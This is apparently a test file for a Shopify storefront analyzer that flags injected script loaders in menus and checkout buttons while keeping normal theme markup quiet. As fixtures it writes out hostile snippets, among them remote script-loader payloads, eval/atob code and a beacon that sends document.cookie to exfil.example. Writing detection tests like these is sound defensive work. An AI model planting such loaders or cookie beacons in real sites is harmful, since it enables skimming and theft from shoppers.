/**
 * Checkout guard analyzer (gc-1q1s.2) and the shared loader-payload matcher.
 * Fixture tests lean on false positives: Dawn-family headers, the async CSS
 * onload idiom, image fade-ins, click handlers that open links, JSON-LD in
 * breadcrumbs, and known apps / tag hosts must all stay quiet.
 */
import { describe, it, expect } from "vitest";

import { findMaliciousInHomepage, walkHomepage } from "../../app/services/runtime-malicious.server";
import { findScriptPayload, MAX_PAYLOAD_TEXT } from "../../app/services/script-payload.server";
import {
  findGuardRegions,
  analyzeStorefrontHtml,
  ownStoreHosts,
} from "../../app/services/storefront-analyzer.server";
import { timedMinMs } from "../test-utils/timing";

const page = (body: string, head = "") =>
  `<!doctype html><html><head><script>var Shopify = Shopify || {};Shopify.shop = "x.myshopify.com";</script>${head}</head><body>${body}</body></html>`;

/** The 17TRACK menu-label loader shape (gc-dr7a), with a host of our choosing. */
const loader = (host: string) =>
  `var s=document.createElement('script');s.src='https://${host}/l2.js';document.head.appendChild(s)`;

/** A trimmed Dawn header: header-menu, menu-drawer, cart icon, async CSS. */
const DAWN_HEADER = `
<link rel="stylesheet" href="//x.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css" media="print" onload="this.media='all'">
<sticky-header data-sticky-type="on-scroll-up" class="header-wrapper">
  <header class="header header--middle-left">
    <header-drawer data-breakpoint="tablet">
      <details id="Details-menu-drawer-container" class="menu-drawer-container">
        <summary class="header__icon header__icon--menu" aria-label="Menu"><span><svg aria-hidden="true" focusable="false" class="icon icon-hamburger"><use href="#icon-hamburger"/></svg></span></summary>
        <div id="menu-drawer" class="gradient menu-drawer motion-reduce">
          <menu-drawer><nav class="menu-drawer__navigation"><ul class="menu-drawer__menu has-submenu list-menu" role="list">
            <li><a id="HeaderDrawer-catalog" href="/collections/all" class="menu-drawer__menu-item list-menu__item link link--text focus-inset">Catalog</a></li>
            <li><a id="HeaderDrawer-contact" href="/pages/contact" class="menu-drawer__menu-item list-menu__item link link--text focus-inset">Contact</a></li>
          </ul></nav></menu-drawer>
        </div>
      </details>
    </header-drawer>
    <a href="/" class="header__heading-link link link--text focus-inset"><img src="//x.myshopify.com/cdn/shop/files/logo.png?v=1&width=600" alt="Shop" width="600" height="200" loading="lazy" onload="this.classList.add('loaded')"></a>
    <nav class="header__inline-menu"><header-menu><ul class="list-menu list-menu--inline" role="list">
      <li><a id="HeaderMenu-home" href="/" class="header__menu-item list-menu__item link link--text focus-inset"><span>Home</span></a></li>
      <li><a id="HeaderMenu-catalog" href="/collections/all" class="header__menu-item list-menu__item link link--text focus-inset"><span>Catalog</span></a></li>
    </ul></header-menu></nav>
    <a href="/cart" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble"><span class="visually-hidden">Cart</span></a>
  </header>
</sticky-header>
<nav class="breadcrumb"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":"https://evil-looking.example/x"}]}</script></nav>
<script src="//x.myshopify.com/cdn/shop/t/1/assets/global.js?v=1" defer="defer"></script>
`;

/** A trimmed Dawn cart footer: the checkout button rendered while the cart is empty. */
const DAWN_CART = `
<form action="/cart" method="post" id="cart"><div class="cart__ctas">
  <button type="submit" id="checkout" class="cart__checkout-button button" name="checkout" disabled form="cart">Check out</button>
</div></form>
<div class="additional-checkout-buttons"><div class="dynamic-checkout__content" id="dynamic-checkout-cart" data-shopify="dynamic-checkout-cart"></div></div>
`;

describe("findScriptPayload", () => {
  it.each([
    ["creates_script", loader("evil.example")],
    ["dynamic_import", "import('https://evil.example/m.js')"],
    ["evaluates_code", "eval(x)"],
    ["evaluates_code", "new Function('return 1')()"],
    ["decodes_code", "eval(atob('ZG9jdW1lbnQ='))".replace("eval", "x=")],
    ["decodes_code", "String.fromCharCode(104,105)"],
    ["writes_markup", "document.write('<scr'+'ipt src=//evil.example/a.js></scr'+'ipt>')"],
  ])("matches %s", (reason, text) => {
    expect(findScriptPayload(text)?.reason).toBe(reason);
  });

  it("reports the first non-Shopify host for a fingerprint", () => {
    expect(findScriptPayload(loader("cdn.evil.example"))).toEqual({
      reason: "creates_script",
      host: "cdn.evil.example",
    });
  });

  it.each([
    "this.media='all'",
    "this.media='all'; this.onload = null",
    "this.classList.add('loaded')",
    "this.style.display='none'",
    "this.src='https://cdn.shopify.com/s/files/placeholder.png'",
    "",
  ])("never matches the benign handler %j", (text) => {
    expect(findScriptPayload(text, { urlCounts: true })).toBeNull();
  });

  it("a non-Shopify URL counts only when urlCounts is set (onerror/onload)", () => {
    const open = "window.open('https://wa.me/15551234567')";
    expect(findScriptPayload(open)).toBeNull();
    expect(findScriptPayload(open, { urlCounts: true })).toEqual({
      reason: "external_url",
      host: "wa.me",
    });
  });

  it("reads at most MAX_PAYLOAD_TEXT characters", () => {
    expect(findScriptPayload(`${"a".repeat(MAX_PAYLOAD_TEXT)}eval(x)`)).toBeNull();
  });
});

describe("analyzeStorefrontHtml: false-positive guards", () => {
  it("a Dawn header and empty-cart footer are completely quiet", () => {
    const out = analyzeStorefrontHtml(page(DAWN_HEADER + DAWN_CART), {
      shopHosts: ["x.myshopify.com"],
    });
    expect(out).toEqual({ maliciousHits: [], loaders: [], hosts: [] });
  });

  it("a click handler that opens a chat link is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<button onclick="window.open('https://wa.me/15551234567')">Chat</button>`),
    );
    expect(out.loaders).toEqual([]);
  });

  it("tag hosts on the allowlist, known apps and benign libraries are not new hosts", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>` +
          `<script src="https://connect.facebook.net/en_US/fbevents.js"></script>` +
          `<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>`,
      ),
    );
    expect(out.hosts).toEqual([]);
  });

  it("hosts the latest theme scan already saw are not new", () => {
    const out = analyzeStorefrontHtml(
      page(`<script src="https://widgets.vendor.io/w.js"></script>`),
      {
        knownThemeHosts: new Set(["widgets.vendor.io"]),
      },
    );
    expect(out.hosts).toEqual([]);
  });

  it("links, hints, inline-JS strings and images never make a new host", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<link rel="stylesheet" href="https://fonts.vendor.io/a.css">` +
          `<link rel="preconnect" href="https://pre.vendor.io">` +
          `<script>var cfg = { api: "https://api.vendor.io/v1" };</script>` +
          `<img src="https://img.vendor.io/a.png"><a href="https://blog.vendor.io">blog</a>`,
      ),
    );
    expect(out.hosts).toEqual([]);
  });

  it("a script inside a commented-out menu is not read", () => {
    const out = analyzeStorefrontHtml(
      page(`<!-- <nav><img src=x onerror="${loader("evil.example")}"></nav> -->`),
    );
    expect(out.loaders).toEqual([]);
  });
});

describe("analyzeStorefrontHtml: the store's own hosts (audit fix)", () => {
  const ctx = { shopHosts: ["mystore.com", "mystore.myshopify.com"] };

  it("a theme script served from the store's own domain inside the menu is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="//mystore.com/cdn/shop/t/1/assets/menu.js"></script></nav>`),
      ctx,
    );
    expect(out.loaders).toEqual([]);
  });

  it("an image fallback to the store's own domain is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src="/a.png" onerror="this.src='//mystore.com/cdn/shop/files/fallback.png'">`),
      ctx,
    );
    expect(out.loaders).toEqual([]);
  });

  it("an image fallback to any other host is not a loader either (no script, no network call)", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<img src="/a.png" onerror="this.onerror=null;this.src='https://placehold.co/600x400'">`,
      ),
    );
    expect(out.loaders).toEqual([]);
  });

  it("a handler that points at an external .js file is still a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src=x onerror="s.src='https://loader.example/l3.js?v=1'">`),
    );
    expect(out.loaders.map((l) => [l.reason, l.host])).toEqual([
      ["external_url", "loader.example"],
    ]);
  });

  it("a handler that beacons to an external host is a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src=x onload="navigator.sendBeacon('https://exfil.example/c', document.cookie)">`),
    );
    expect(out.loaders[0]).toMatchObject({ reason: "external_url", host: "exfil.example" });
  });

  it("code construction on the store's own host is still a loader, keyed by its reason", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<img src=x onerror="var s=document.createElement('script');s.src='//mystore.com/x.js';document.head.appendChild(s)">`,
      ),
      ctx,
    );
    expect(out.loaders.map((l) => [l.fingerprint, l.host])).toEqual([
      ["SCRIPT_LOADER:creates_script", null],
    ]);
  });

  it("the www twin of the store's own hosts is trusted too (audit fix)", () => {
    for (const src of ["//www.mystore.com/cdn/x.js", "//www.mystore.myshopify.com/x.js"]) {
      const out = analyzeStorefrontHtml(page(`<nav><script src="${src}"></script></nav>`), ctx);
      expect(out.loaders, src).toEqual([]);
    }
    const apex = analyzeStorefrontHtml(
      page(`<nav><script src="//mystore.com/cdn/x.js"></script></nav>`),
      { shopHosts: ["www.mystore.com"] },
    );
    expect(apex.loaders).toEqual([]);
  });

  it("never trusts another parent of the store's hosts", () => {
    expect([...ownStoreHosts(["mystore.myshopify.com", "Shop.Example.co.uk"])].sort()).toEqual([
      "mystore.myshopify.com",
      "shop.example.co.uk",
      "www.mystore.myshopify.com",
      "www.shop.example.co.uk",
    ]);
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://example.co.uk/l.js"></script></nav>`),
      { shopHosts: ["shop.example.co.uk"] },
    );
    expect(out.loaders.map((l) => l.host)).toEqual(["example.co.uk"]);
  });

  it("theme-scan hosts are trusted for menu scripts too", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://menu.vendor.io/m.js"></script></nav>`),
      { knownThemeHosts: new Set(["menu.vendor.io"]) },
    );
    expect(out.loaders).toEqual([]);
  });
});

describe("analyzeStorefrontHtml: signals", () => {
  it("the 17TRACK menu-label loader on a listed domain is KNOWN_MALICIOUS only (no duplicate loader)", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><a href="/x"><img src=x onerror="${loader("cartassure.top")}">Shop</a></nav>`),
    );
    expect(out.maliciousHits.map((h) => h.domain)).toEqual(["cartassure.top"]);
    expect(out.loaders).toEqual([]);
  });

  it("the same loader on an UNLISTED domain is a SCRIPT_LOADER in the store menu", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<nav><a href="/x"><img src=x onerror="${loader("checkout-guard.example")}">Shop</a></nav>`,
      ),
    );
    expect(out.maliciousHits).toEqual([]);
    expect(out.loaders).toEqual([
      {
        fingerprint: "SCRIPT_LOADER:checkout-guard.example",
        host: "checkout-guard.example",
        reason: "creates_script",
        label: "Code in an onerror attribute in your store menu",
        region: "menu",
      },
    ]);
  });

  it("a loader written into the checkout button label is named as such", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<button type="submit" name="checkout">Check out<img src=x onerror="${loader("pay-verify.example")}"></button>`,
      ),
    );
    expect(out.loaders[0].label).toBe("Code in an onerror attribute in the checkout button");
  });

  it("HTML-encoded payloads are decoded before matching", () => {
    const encoded = `var s=document.createElement(&#39;script&#39;);s.src=&quot;https:&#47;&#47;enc.example&#47;a.js&quot;`;
    const out = analyzeStorefrontHtml(page(`<img src=x onerror="${encoded}">`));
    expect(out.loaders[0]).toMatchObject({ host: "enc.example", reason: "creates_script" });
  });

  it("a host-less loader is keyed by its reason", () => {
    const out = analyzeStorefrontHtml(page(`<svg onload="eval(atob('YWxlcnQoMSk='))"></svg>`));
    expect(out.loaders[0].fingerprint).toBe("SCRIPT_LOADER:evaluates_code");
    expect(out.loaders[0].host).toBeNull();
  });

  it("an external script inside the menu is a loader; a Shopify-hosted one is not", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<nav><script src="https://menu-cdn.example/m.js"></script>` +
          `<script src="//x.myshopify.com/cdn/shop/t/1/assets/menu.js"></script></nav>`,
      ),
    );
    expect(out.loaders.map((l) => [l.reason, l.host])).toEqual([
      ["script_in_menu", "menu-cdn.example"],
    ]);
  });

  it("an inline script inside the checkout button that builds a script is a loader", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<a href="/checkout" class="btn">Checkout<script>${loader("x-pay.example")}</script></a>`,
      ),
    );
    expect(out.loaders[0]).toMatchObject({ reason: "script_in_checkout", host: "x-pay.example" });
  });

  it("collects new script, app script-tag, frame and form hosts once each", () => {
    const head = `<script>function asyncLoad(){var urls = ["https:\\/\\/tags.newapp.io\\/t.js?shop=x.myshopify.com"];}window.attachEvent ? window.attachEvent('onload', asyncLoad) : window.addEventListener('load', asyncLoad, false);</script>`;
    const out = analyzeStorefrontHtml(
      page(
        `<script src="https://new.vendor.io/a.js"></script><script src="https://new.vendor.io/b.js"></script>` +
          `<iframe src="https://frame.vendor.io/x"></iframe><form action="https://collect.vendor.io/p"></form>`,
        head,
      ),
    );
    expect(out.hosts.map((h) => [h.host, h.source])).toEqual([
      ["tags.newapp.io", "script_tag"],
      ["new.vendor.io", "script"],
      ["frame.vendor.io", "iframe"],
      ["collect.vendor.io", "form"],
    ]);
  });

  it("an empty page yields nothing", () => {
    expect(analyzeStorefrontHtml("")).toEqual({ maliciousHits: [], loaders: [], hosts: [] });
  });

  it("Object.prototype names as elements, attributes, handlers and hosts never blind it (gc-7gjj.4 class)", () => {
    // A `<constructor>` tag crashed the homepage walk once (fd9f241); the
    // analyzer reads the same walk plus its own lookups, so every
    // prototype-member name must stay an ordinary name here too.
    for (const name of Object.getOwnPropertyNames(Object.prototype).map((n) => n.toLowerCase())) {
      const tag = /^[a-z]/.test(name) ? name : `x${name}`;
      // A hostname label cannot hold `_`; `__proto__` -> `proto.example`.
      const label = name.replace(/_/g, "");
      const out = analyzeStorefrontHtml(
        page(
          `<${tag} ${name}=1 on${name}="x()" onerror="fetch('https://${name}/a.js')">t</${tag}>` +
            `<script src="https://${label}.example/a.js"></script>` +
            `<nav><img src=x onerror="${loader("checkout-guard.example")}">` +
            `<img src=x onerror="${loader("cartassure.top")}"></nav>`,
        ),
      );
      expect(
        out.maliciousHits.map((h) => h.domain),
        name,
      ).toEqual(["cartassure.top"]);
      expect(
        out.loaders.map((l) => l.host),
        name,
      ).toContain("checkout-guard.example");
      expect(
        out.hosts.map((h) => h.host),
        name,
      ).toContain(`${label}.example`);
    }
  });

  it("stays linear on a large page of handlers (1 MB)", () => {
    const html = page(`<img src=x onload="this.classList.add('a')">`.repeat(25_000));
    const started = Date.now();
    analyzeStorefrontHtml(html);
    expect(Date.now() - started).toBeLessThan(3000);
  });
});

describe("findGuardRegions", () => {
  it("finds menu elements and checkout buttons, not other buttons", () => {
    const kinds = findGuardRegions(
      page(DAWN_HEADER + DAWN_CART + `<button name="add">Add</button>`),
    )
      .map((r) => r.kind)
      .sort();
    expect(kinds.filter((k) => k === "checkout")).toHaveLength(1);
    expect(kinds.filter((k) => k === "menu").length).toBeGreaterThanOrEqual(3);
  });
});

describe("findGuardRegions: an element that never closes (audit fix)", () => {
  it("an unclosed nav or checkout button is no region, so later scripts are not in it", () => {
    for (const open of ["<nav>", '<button name="checkout">Check out']) {
      const html = page(
        `${open}<div>${"x".repeat(5000)}</div><script src="https://cdn.vendor.example/app.js"></script>`,
      );
      expect(findGuardRegions(html), open).toEqual([]);
      expect(analyzeStorefrontHtml(html).loaders, open).toEqual([]);
    }
  });

  it("a closed region still holds its script", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://cdn.vendor.example/app.js"></script></nav>`),
    );
    expect(out.loaders.map((l) => l.reason)).toEqual(["script_in_menu"]);
  });
});

describe("findGuardRegions: [role=navigation] elements (gc-njwa #3)", () => {
  const ext = `<script src="https://menu-cdn.example/m.js"></script>`;
  const menuLoaders = (body: string) =>
    analyzeStorefrontHtml(page(body)).loaders.map((l) => [l.reason, l.host]);

  it("a div with role=navigation is a menu region (any case, quoted or not, in a role list)", () => {
    for (const open of [
      '<div role="navigation">',
      "<div role=navigation>",
      "<DIV ROLE='Navigation'>",
      '<div class="x" role=" navigation menubar ">',
    ]) {
      expect(menuLoaders(`${open}<a href="/">Home</a>${ext}</div>`), open).toEqual([
        ["script_in_menu", "menu-cdn.example"],
      ]);
    }
  });

  it("the region ends at ITS close tag, counting nested elements of the same name", () => {
    expect(menuLoaders(`<div role="navigation"><div><div>a</div></div>${ext}</div>`)).toEqual([
      ["script_in_menu", "menu-cdn.example"],
    ]);
    // After the region closes: not in the menu.
    expect(menuLoaders(`<div role="navigation"><div>a</div></div>${ext}`)).toEqual([]);
    const regions = findGuardRegions(
      page(`<ul role="navigation"><li><ul><li>x</li></ul></li></ul><p>after</p>`),
    );
    expect(regions).toHaveLength(1);
  });

  it("only a real role attribute counts (not text inside another value or a script)", () => {
    for (const body of [
      `<div data-x="role=navigation">${ext}</div>`,
      `<div title='a role="navigation"'>${ext}</div>`,
      `<div aria-roledescription="navigation">${ext}</div>`,
      `<div role="presentation">${ext}</div>`,
      `<script>var t='<div role="navigation">';</script><div>${ext}</div>`,
      `<!-- <div role="navigation"> --><div>${ext}</div>`,
    ]) {
      expect(menuLoaders(body), body).toEqual([]);
    }
  });

  it("an element that never closes is no region (like nav, audit fix)", () => {
    const html = page(`<div role="navigation"><p>x</p>${ext}`);
    expect(findGuardRegions(html)).toEqual([]);
    expect(analyzeStorefrontHtml(html).loaders).toEqual([]);
  });

  it("a script loaded from a theme-trusted host inside the region stays quiet", () => {
    expect(
      menuLoaders(
        `<div role="navigation"><script src="//x.myshopify.com/cdn/shop/t/1/assets/menu.js"></script></div>`,
      ),
    ).toEqual([]);
  });

  it("caps the regions and stays linear on a page full of them (1 MB)", () => {
    const html = page(`<div role="navigation"><div>x</div></div>`.repeat(25_000));
    const started = Date.now();
    const regions = findGuardRegions(html);
    expect(Date.now() - started).toBeLessThan(3000);
    expect(regions.length).toBeLessThanOrEqual(200);
    // Deep nesting of the same name, never closed.
    const deep = page(`<div role="navigation">${"<div>".repeat(100_000)}`);
    const t2 = Date.now();
    expect(findGuardRegions(deep)).toEqual([]);
    expect(Date.now() - t2).toBeLessThan(3000);
  });
});

describe("walkHomepage (shared with findMaliciousInHomepage)", () => {
  it("reports every loading host with its source and raw URL, in page order", () => {
    const seen: Array<[string, string, string | null]> = [];
    walkHomepage(
      page(
        `<script src="https://a.example/x.js"></script><link rel="stylesheet" href="https://b.example/c.css">`,
      ),
      ["https://st.example/t.js"],
      { host: (h, s, raw) => seen.push([h, s, raw]) },
    );
    expect(seen).toEqual([
      ["st.example", "script_tag", "https://st.example/t.js"],
      ["a.example", "script", "https://a.example/x.js"],
      ["b.example", "link", "https://b.example/c.css"],
    ]);
  });

  it("findMaliciousInHomepage is unchanged by the refactor (same hit for the same page)", () => {
    expect(
      findMaliciousInHomepage(page(`<img src=x onerror="${loader("cartassure.top")}">`), []),
    ).toEqual([{ domain: "cartassure.top", host: "cartassure.top", source: "event_handler" }]);
  });
});

describe("findGuardRegions: offsets survive expanding characters (wave 3 D2)", () => {
  const nav = `<nav><script src="https://newhost.example/a.js"></script></nav>`;
  const loaders = (html: string) =>
    analyzeStorefrontHtml(page(html)).loaders.map((l) => l.fingerprint);

  it("a menu script after many İ (two code units lower-cased) is still in the menu", () => {
    expect("İ".toLowerCase()).toHaveLength(2);
    for (const filler of ["İ".repeat(200), "ẞ".repeat(200), "ﬀİﬃ".repeat(100)]) {
      expect(loaders(`<p>${filler}</p>${nav}`), filler.slice(0, 3)).toEqual([
        "SCRIPT_LOADER:newhost.example",
      ]);
      expect(
        loaders(
          `<p>${filler}</p><div role=navigation><script src="https://newhost.example/a.js"></script></div>`,
        ),
      ).toEqual(["SCRIPT_LOADER:newhost.example"]);
    }
  });

  it("region offsets are offsets into the original page", () => {
    const html = `<p>${"İ".repeat(50)}</p><NAV>x</NAV>`;
    expect(findGuardRegions(html)).toEqual([
      { start: html.indexOf("<NAV>"), end: html.indexOf("</NAV>"), kind: "menu" },
    ]);
  });

  it("a script after the menu stays outside it, İ before or not", () => {
    expect(loaders(`<p>${"İ".repeat(60)}</p><nav>x</nav><script>eval(x)</script>`)).toEqual([]);
  });
});

describe("findGuardRegions: regions come from real tags only (wave 3 D4)", () => {
  const ext = `<script src="https://newhost.example/a.js"></script>`;
  const regions = (html: string) => findGuardRegions(html).map((r) => r.kind);

  it("a menu or checkout tag name in a script, comment, attribute or template opens nothing", () => {
    for (const fake of [
      `<script>var t='<nav class="a">';</script>`,
      `<!-- <nav> -->`,
      `<div data-t="<nav>"></div>`,
      `<template><nav></template>`,
      `<script>var b='<button name="checkout">';</script>`,
      `<div data-t='<a href="/checkout">'></div>`,
      `<textarea><header-menu></textarea>`,
    ]) {
      const html = `${fake}<div><script>eval(x)</script>${ext}</div><nav>r</nav>`;
      expect(analyzeStorefrontHtml(page(html)).loaders, fake).toEqual([]);
      expect(regions(html), fake).toEqual(["menu"]);
    }
  });

  it("every region kind comes from the tag walk (nav, custom menus, role, checkout)", () => {
    const html =
      `<header-menu>a</header-menu><menu-drawer>b</menu-drawer><mega-menu>c</mega-menu>` +
      `<nav>d</nav><ul role="navigation">e</ul><button name="checkout">f</button>` +
      `<a href="/checkout?x=1">g</a><a id="CartCheckout">h</a><a href="/checkouts/x">no</a>`;
    expect(regions(html).sort()).toEqual([
      "checkout",
      "checkout",
      "checkout",
      "menu",
      "menu",
      "menu",
      "menu",
      "menu",
    ]);
  });

  it("a close tag must be the element's own name (`</a` is not `</aside>`, `</nav` not `</navx>`)", () => {
    const inCheckout = `<a href="/checkout"><aside>x</aside>${ext}</a>`;
    expect(analyzeStorefrontHtml(page(inCheckout)).loaders.map((l) => l.reason)).toEqual([
      "script_in_checkout",
    ]);
    const inNav = `<nav><navx>x</navx>${ext}</nav>`;
    expect(analyzeStorefrontHtml(page(inNav)).loaders.map((l) => l.reason)).toEqual([
      "script_in_menu",
    ]);
    // A raw-text body ends only at its own close tag too.
    const raw = `<nav><script>var a='</scriptx>';</script>${ext}</nav>`;
    expect(analyzeStorefrontHtml(page(raw)).loaders.map((l) => l.reason)).toEqual([
      "script_in_menu",
    ]);
  });

  it("nested menu elements of the same name end at the outer close tag", () => {
    expect(
      analyzeStorefrontHtml(page(`<nav><nav>x</nav>${ext}</nav>`)).loaders.map((l) => l.reason),
    ).toEqual(["script_in_menu"]);
  });
});

describe("findScriptPayload: script-file URL check is linear (wave 3 D3)", () => {
  it("still reads .js/.mjs URLs (end, query, hash, paren) and nothing else", () => {
    const hit = (v: string) => findScriptPayload(v, { urlCounts: true })?.reason ?? null;
    expect(hit("x('https://e.example/a.js')")).toBe("external_url");
    expect(hit("x('https://e.example/a.MJS?v=1')")).toBe("external_url");
    expect(hit("x(https://e.example/a.js)")).toBe("external_url");
    expect(hit("s='//e.example/a.js#x'")).toBe("external_url");
    expect(hit("x('https://e.example/a.json')")).toBeNull();
    expect(hit("x('https://e.example/a.png')")).toBeNull();
    expect(hit("x('https://e.example/a' + '.js')")).toBeNull();
  });

  it("analyzes a 5 MB page of slash-heavy handlers in well under a second", () => {
    const one = `<img onerror="https://a.example/${"/".repeat(8200)}">`;
    const html = page(one.repeat(Math.floor(5_000_000 / one.length)));
    expect(timedMinMs(() => analyzeStorefrontHtml(html))).toBeLessThan(500);
  }, 30_000);
});

describe("walkHomepage: an opaque body ends only at its real close tag (wave 4 M1)", () => {
  const BAD = "cb28utrk.com";
  const sources = (html: string) => findMaliciousInHomepage(html, []).map((h) => h.source);
  const urls = (html: string) => {
    const out: string[] = [];
    walkHomepage(html, [], {
      host(_host, _source, rawUrl) {
        if (rawUrl) out.push(rawUrl);
      },
    });
    return out;
  };

  it("a `</scriptx` inside a script string does not end the script (probe case)", () => {
    const html = page(
      `<script>var x="</scriptx"; document.write("<s"+"cript src=//${BAD}/x.js>")</script>`,
    );
    expect(sources(html)).toEqual(["inline_script"]);
  });

  it("the analyzer still reads the hidden payload as a menu loader", () => {
    const html = page(
      `<nav><script>var x="</scriptx"; document.write("<s"+"cript src=//evil.example/x.js>")</script></nav>`,
    );
    const r = analyzeStorefrontHtml(html);
    expect(r.loaders.map((l) => l.fingerprint)).toEqual(["SCRIPT_LOADER:evil.example"]);
  });

  it("the script body handed to the visitor runs to the real close tag", () => {
    const bodies: string[] = [];
    walkHomepage(`<script>a("</script-x")</SCRIPT\tb><p>`, [], {
      host() {},
      script(_at, info) {
        bodies.push(info.body());
      },
    });
    expect(bodies).toEqual([`a("</script-x")`]);
  });

  it.each(["textarea", "title", "template", "noscript", "xmp", "noembed", "noframes", "style"])(
    "<%s>: a look-alike close tag does not end its text body",
    (el) => {
      const inner = `</${el}x><script src=//${BAD}/a.js></script>`;
      expect(sources(page(`<${el}>${inner}</${el}>`))).toEqual([]);
      // Its own start tag never closes (quoted `>`): skipped to the real close too.
      expect(
        sources(page(`<${el} a="></${el}x><script src=//${BAD}/a.js></script></${el}>`)),
      ).toEqual([]);
      // After a start tag that never closed (handlers off): same.
      expect(
        urls(page(`<div a="x><${el}>${inner}</${el}><script src=//${BAD}/b.js></script>`)),
      ).toEqual([`//${BAD}/b.js`]);
      // A real close tag (any case, then space, / or >) still ends it.
      for (const close of [`</${el}>`, `</${el.toUpperCase()} >`, `</${el}/>`]) {
        expect(sources(page(`<${el}>x${close}<script src=//${BAD}/a.js></script>`))).toEqual([
          "script",
        ]);
      }
    },
  );

  it("<iframe>: a look-alike close tag does not end its fallback text", () => {
    expect(
      sources(page(`<iframe src=/x></iframex><script src=//${BAD}/a.js></script></iframe>`)),
    ).toEqual([]);
    expect(sources(page(`<iframe src=/x></iframe ><script src=//${BAD}/a.js></script>`))).toEqual([
      "script",
    ]);
  });
});
